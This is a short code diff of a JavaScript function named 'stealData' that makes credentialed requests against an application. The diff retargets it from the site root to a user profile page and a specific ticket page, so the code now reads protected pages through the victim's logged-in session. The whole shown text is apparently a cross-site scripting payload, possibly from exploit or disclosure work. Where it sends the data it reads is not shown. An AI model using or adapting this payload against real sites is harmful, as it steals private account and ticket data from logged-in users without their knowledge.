@@ -4,9 +4,9 @@ function read_body(xhr) {
     if (xhr.responseType === "json") return xhr.responseJSON;
     return xhr.response;
 }
-function stealData() {
+function stealData(url) {
     var xhr = new XMLHttpRequest();
-    xhr.open("GET", "/", true);
+    xhr.open("GET", url, true);
     xhr.withCredentials = true;
     xhr.send(null);
     xhr.onreadystatechange = function() {
@@ -22,4 +22,5 @@ function stealData() {
         }
     };
 }
-stealData();
+stealData("/Prefs/AboutMe.html");
+stealData("/Ticket/Display.html?id=383442");
